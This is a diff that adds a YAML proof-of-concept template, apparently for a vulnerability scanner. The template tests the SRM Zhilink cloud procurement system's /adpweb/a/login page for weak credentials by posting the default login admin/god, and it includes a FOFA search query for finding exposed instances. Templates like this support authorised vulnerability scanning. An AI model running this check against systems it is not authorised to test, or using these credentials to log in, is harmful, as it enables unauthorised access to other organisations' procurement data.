@@ -1,0 +1,19 @@
+id: poc-yaml-zhilink-srm-adpweb-login
+info:
+  name: SRM智联云采系统 /adpweb/a/login 弱口令漏洞
+  severity: medium
+  tags:
+  - 弱口令
+  finger: srm
+  fofa: title=="SRM 2.0"
+requests:
+- method: POST
+  path: /adpweb/a/login
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: username=admin&password=god
+  expression: "status_code == 302 && \nbody == \"\" &&\ncontains(headers,\"/adpweb/a;JSESSIONID=\"\
+    ) &&\ncontains(headers,\"zhilink.session.id=\") &&\ncontains(headers,\"Path=/adpweb\"\
+    )\n"
+variables: {}
+transport: http
